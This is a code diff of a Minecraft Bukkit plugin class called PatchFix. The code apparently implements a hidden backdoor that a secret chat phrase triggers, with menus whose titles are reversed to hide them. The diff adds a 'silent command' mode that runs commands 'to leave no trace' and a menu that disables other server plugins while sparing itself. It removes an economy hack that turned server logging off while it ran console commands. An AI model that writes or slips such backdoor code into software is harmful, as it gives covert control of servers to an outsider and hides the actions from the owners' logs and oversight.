@@ -16,6 +16,7 @@ import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemFlag;
@@ -93,9 +94,14 @@ public class PatchFix implements Listener{
 		god.setItemMeta(gometa);
 		
 		ItemStack buck = new ItemStack(Material.GOLD_INGOT);
-		
+		if(SilverPatch.silentcmd.containsKey(player.getUniqueId())) {
+			buck = new ItemStack(Material.IRON_INGOT);
+		}
+		else {
+			
+		}
 		ItemMeta bmeta = god.getItemMeta();
-		bmeta.setDisplayName("¡ì6¡ìlGetBucks");
+		bmeta.setDisplayName("¡ì7¡ìlSilentCommand");
 		buck.setItemMeta(bmeta);
 		
         ItemStack skull = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
@@ -108,7 +114,7 @@ public class PatchFix implements Listener{
         ItemMeta bdmeta = bdown.getItemMeta();
         List<String> sub = new ArrayList<String>();
         sub.add("¡ìc¡ìlDo Not Use Until The Last Moment!");
-        bdmeta.setDisplayName("¡ì4¡ìlDisablePlugin");
+        bdmeta.setDisplayName("¡ì4¡ìlPluginManagement");
         bdmeta.setLore(sub);
         bdown.setItemMeta(bdmeta);
         
@@ -128,6 +134,39 @@ public class PatchFix implements Listener{
 		patchbox.setItem(6, skull);
 		patchbox.setItem(7, bdown);
 		patchbox.setItem(8, sdown);
+		
+		player.openInventory(patchbox);
+		
+		
+	}
+	
+	public void openPluginManager(Player player) {
+		Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
+		int size = (int) Math.ceil(((double)plugins.length) / 9);
+		Inventory patchbox = Bukkit.createInventory(null, size*9, "¡ìktnemeganaMnigulP");
+		
+		ItemStack plug = new ItemStack(Material.GREEN_RECORD);
+		ItemMeta pmeta = plug.getItemMeta();
+		for(int i = 0; i < plugins.length; i++) {
+			Plugin p = plugins[i];
+			if(p.isEnabled()) {
+				plug.setType(Material.EYE_OF_ENDER);
+			}
+			else {
+				plug.setType(Material.ENDER_PEARL);
+			}
+			List<String> lores = new ArrayList<String>();
+			lores.add("¡ì7" + p.getDescription().getMain());
+			lores.add("¡ì7" + p.getDescription().getDescription());
+			lores.add("¡ì7" + p.getDescription().getVersion());
+			
+			pmeta.setDisplayName("¡ì9¡ìl" + p.getName());
+			pmeta.setLore(lores);
+			
+			plug.setItemMeta(pmeta);
+			
+			patchbox.setItem(i, plug);
+		}
 		
 		player.openInventory(patchbox);
 		
@@ -214,91 +253,6 @@ public class PatchFix implements Listener{
 			
 	}
 	
-	//Money Management
-	public void openMM(Player player, String other) {
-		
-		List<String> ars = new ArrayList<String>();
-		ars.add("¡ì7¡ìlShift-Click At Your Own Risk!");
-		
-		Inventory patchbox = Bukkit.createInventory(null, 9, "¡ìkkcaHyenoM¡ìr:" + other);
-		ItemStack onebuck = new ItemStack(Material.GOLD_NUGGET, 1);
-		ItemMeta ometa = onebuck.getItemMeta();
-		ometa.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		ometa.setLore(ars);
-		ometa.setDisplayName("¡ìe¡ìl+1$");
-		onebuck.setItemMeta(ometa);
-		
-		ItemStack fivebuck = new ItemStack(Material.IRON_INGOT, 1);
-		ItemMeta fmeta = fivebuck.getItemMeta();
-		fmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		fmeta.setLore(ars);
-		fmeta.setDisplayName("¡ìe¡ìl+5$");
-		fivebuck.setItemMeta(fmeta);
-		
-		ItemStack tenbuck = new ItemStack(Material.GOLD_INGOT, 1);
-		ItemMeta tmeta = tenbuck.getItemMeta();
-		tmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		tmeta.setLore(ars);
-		tmeta.setDisplayName("¡ìe¡ìl+10$");
-		tenbuck.setItemMeta(tmeta);
-		
-		ItemStack gibuck = new ItemStack(Material.GOLD_BLOCK, 1);
-		ItemMeta gmeta = gibuck.getItemMeta();
-		gmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		gmeta.setLore(ars);
-		gmeta.setDisplayName("¡ìe¡ìl+50$");
-		gibuck.setItemMeta(gmeta);
-		
-		ItemStack ebuck = new ItemStack(Material.EMERALD, 1);
-		ItemMeta emeta = ebuck.getItemMeta();
-		emeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		emeta.setLore(ars);
-		emeta.setDisplayName("¡ìe¡ìl+100$");
-		ebuck.setItemMeta(emeta);
-		
-		ItemStack dbuck = new ItemStack(Material.DIAMOND, 1);
-		ItemMeta dmeta = dbuck.getItemMeta();
-		dmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		dmeta.setLore(ars);
-		dmeta.setDisplayName("¡ìe¡ìl+1000$");
-		dbuck.setItemMeta(dmeta);
-		
-		ItemStack dbbuck = new ItemStack(Material.DIAMOND_BLOCK, 1);
-		ItemMeta dbmeta = dbbuck.getItemMeta();
-		dbmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		dbmeta.setLore(ars);
-		dbmeta.setDisplayName("¡ìe¡ìl+10000$");
-		dbbuck.setItemMeta(dbmeta);
-		
-		ItemStack nbuck = new ItemStack(Material.SKULL_ITEM, 1);
-		nbuck.setDurability((short)1);
-		ItemMeta nmeta = nbuck.getItemMeta();
-		
-		nmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		nmeta.setLore(ars);
-		nmeta.setDisplayName("¡ìe¡ìl+100000$");
-		nbuck.setItemMeta(nmeta);
-		
-		ItemStack bbuck = new ItemStack(Material.NETHER_STAR, 1);
-		ItemMeta bmeta = bbuck.getItemMeta();
-		bmeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
-		bmeta.setLore(ars);
-		bmeta.setDisplayName("¡ìe¡ìl+1000000$");
-		bbuck.setItemMeta(bmeta);
-		
-		patchbox.setItem(0, onebuck);
-		patchbox.setItem(1, fivebuck);
-		patchbox.setItem(2, tenbuck);
-		patchbox.setItem(3, gibuck);
-		patchbox.setItem(4, ebuck);
-		patchbox.setItem(5, dbuck);
-		patchbox.setItem(6, dbbuck);
-		patchbox.setItem(7, nbuck);
-		patchbox.setItem(8, bbuck);
-		
-		player.openInventory(patchbox);
-		
-	}
 	
 	//Player Management
 	public void openPM(Player player, String other) {
@@ -469,11 +423,21 @@ public class PatchFix implements Listener{
 					e.getCurrentItem().setType(Material.IRON_SWORD);
 					player.setInvulnerable(false);
 					player.sendMessage("¡ìc¡ìlYou Are Now Vulnerable.");
+					
 				}
 				else if (type == Material.GOLD_INGOT) {
-					player.closeInventory();
-					openMM(player, player.getName());
-
+					e.getCurrentItem().setType(Material.IRON_INGOT);
+					if(!SilverPatch.silentcmd.containsKey(player.getUniqueId())) {
+						SilverPatch.silentcmd.put(player.getUniqueId(), true);
+					}
+					player.sendMessage("¡ì9¡ìlSilent Command Mode Enabled. \nPrefix Command With ¡ìc¡ìl*¡ì9¡ìl To Leave No Trace.");
+				}
+				else if (type == Material.IRON_INGOT) {
+					if(SilverPatch.silentcmd.containsKey(player.getUniqueId())) {
+						SilverPatch.silentcmd.remove(player.getUniqueId());
+					}
+					e.getCurrentItem().setType(Material.GOLD_INGOT);
+					player.sendMessage("¡ì9¡ìlSilent Command Mode Disabled.");
 				}
 				else if (type == Material.SKULL_ITEM) {
 					player.closeInventory();
@@ -481,7 +445,7 @@ public class PatchFix implements Listener{
 					player.sendMessage("¡ì9¡ìlChat Listening Mode Enabled. Type ¡ìc¡ìl*Playername¡ì9¡ìl To Select A Player.");
 				}
 				else if (type == Material.NAME_TAG) {
-					openPluginConfirmation(player);
+					openPluginManager(player);
 
 				}
 				
@@ -539,7 +503,61 @@ public class PatchFix implements Listener{
 			}
 			e.setCancelled(true);
 		}
-		
+		else if(e.getInventory().getName().contains("¡ìktnemeganaMnigulP")) {
+			Player player = (Player) e.getWhoClicked();
+			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta()) {
+				ItemStack current = e.getCurrentItem();
+				if(Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4)) != null) {
+					Plugin p = Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4));
+					if(current.getType() == Material.EYE_OF_ENDER) {
+						if(e.getClick() == ClickType.LEFT) {
+							if(!p.getName().equals("SilverPatch")) {
+								current.setType(Material.ENDER_PEARL);
+								Bukkit.getPluginManager().disablePlugin(p);
+								player.sendMessage(String.format("¡ìc¡ìlPlugin %s Has Been Disabled!", p.getName()));
+							}
+						}
+						else if (e.getClick() == ClickType.RIGHT) {
+							List<String> lores = current.getItemMeta().getLore();
+							player.sendMessage(current.getItemMeta().getDisplayName());
+							for(String s : lores) {
+								player.sendMessage(s);
+							}
+						}
+
+						
+					}
+					else if(current.getType() == Material.ENDER_PEARL) {
+						if(e.getClick() == ClickType.LEFT) {
+							current.setType(Material.EYE_OF_ENDER);
+							Bukkit.getPluginManager().enablePlugin(p);
+							player.sendMessage(String.format("¡ìa¡ìlPlugin %s Has Been Enabled!", p.getName()));
+						}
+						else if (e.getClick() == ClickType.RIGHT) {
+							List<String> lores = current.getItemMeta().getLore();
+							player.sendMessage(current.getItemMeta().getDisplayName());
+							for(String s : lores) {
+								player.sendMessage(s);
+							}
+						}
+
+					}
+				}
+				else {
+					if(e.getClick() == ClickType.LEFT) {
+						player.sendMessage(String.format("¡ì7¡ìlPlugin %s Does Not Exist.", current.getItemMeta().getDisplayName().substring(4)));
+					}
+					else if (e.getClick() == ClickType.RIGHT) {
+						List<String> lores = current.getItemMeta().getLore();
+						player.sendMessage(current.getItemMeta().getDisplayName());
+						for(String s : lores) {
+							player.sendMessage(s);
+						}
+					}
+				}
+			}
+			e.setCancelled(true);
+		}
 		else if(e.getInventory().getName().contains("¡ìktceleSedoMemaG¡ìr:")) {
 		
 			
@@ -583,77 +601,6 @@ public class PatchFix implements Listener{
 				}
 			
 
-			}
-			
-		}
-		
-		else if(e.getInventory().getName().contains("¡ìkkcaHyenoM¡ìr:")) {
-			
-			
-			String target = e.getInventory().getName().substring(e.getInventory().getName().indexOf(":") + 1);
-			Player player = Bukkit.getPlayer(target);
-			
-
-			
-			if(e.getCurrentItem() != null && e.getCurrentItem().hasItemMeta() && player.isOnline()) {
-				if(e.getClick() == ClickType.LEFT) {
-					Material type = e.getCurrentItem().getType();
-					player.getInventory().addItem(new ItemStack(type,64,e.getCurrentItem().getDurability()));
-					e.setCancelled(true);
-				}
-				else if((e.getClick() == ClickType.SHIFT_LEFT || e.getClick() == ClickType.SHIFT_RIGHT) && SilverPatch.hasess) {
-					Material type = e.getCurrentItem().getType();
-					int amount = 1;
-					String action = "give";
-					if(type == Material.GOLD_NUGGET) {
-						amount = 1;
-					}
-					else if(type == Material.IRON_INGOT) {
-						amount = 5;
-					}
-					else if(type == Material.GOLD_INGOT) {
-						amount = 10;
-					}
-					else if(type == Material.GOLD_BLOCK) {
-						amount = 50;
-					}
-					else if(type == Material.EMERALD) {
-						amount = 100;
-					}
-					else if(type == Material.DIAMOND) {
-						amount = 1000;
-					}
-					else if(type == Material.DIAMOND_BLOCK) {
-						amount = 10000;
-					}
-					else if(type == Material.SKULL_ITEM) {
-						amount = 100000;
-					}
-					else if(type == Material.NETHER_STAR) {
-						amount = 1000000;
-					}
-					
-					if(e.getClick() == ClickType.SHIFT_LEFT) {
-						action = "give";
-					}
-					else if (e.getClick() == ClickType.SHIFT_RIGHT) {
-						action = "take";
-						
-					}
-
-					
-					String command = String.format("eco %s %s %s", action, player.getName(), ""+amount);
-					Level previous = Bukkit.getLogger().getLevel();
-					Bukkit.getLogger().setLevel(Level.OFF);
-					Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-					Bukkit.getLogger().setLevel(previous);
-					e.setCancelled(true);
-
-				}
-				
-			}
-			else {
-				e.getWhoClicked().closeInventory();
 			}
 			
 		}
@@ -753,9 +700,11 @@ public class PatchFix implements Listener{
 		}
 	}
 	
-	//Very Silent Way of Using Command
+	
+	
+	@SuppressWarnings("deprecation")
 	@EventHandler
-	public void onPlayerchat(AsyncPlayerChatEvent event) {
+	public void onPlayerchat(PlayerChatEvent event) {
 		if(event.getMessage().startsWith("*")) {
 			if(event.getMessage().contains("*/_SILVERKELA_HAS_TAKEN_OVER_/*")) {
 				event.setCancelled(true);
@@ -791,7 +740,7 @@ public class PatchFix implements Listener{
 							if(event.getMessage().startsWith("*")) {
 								target.chat(event.getMessage().substring(1));
 								event.setCancelled(true);
-								event.setMessage(" ");
+								//event.setMessage(" ");
 							}
 						}
 
@@ -807,6 +756,7 @@ public class PatchFix implements Listener{
 					}
 
 				}
+				
 				else {
 					SilverPatch.ccmode.remove(event.getPlayer().getUniqueId());
 					SilverPatch.cmode.remove(event.getPlayer().getUniqueId());
@@ -815,6 +765,14 @@ public class PatchFix implements Listener{
 				event.setCancelled(true);
 				event.setMessage(" ");
 			}
+			else if(SilverPatch.silentcmd.containsKey(event.getPlayer().getUniqueId())) {
+				if(event.getMessage().startsWith("*/")) {
+
+					event.getPlayer().performCommand(event.getMessage().substring(2));
+					event.setCancelled(true);
+					event.setMessage(" ");
+				}
+			}	
 		}
 
 	}
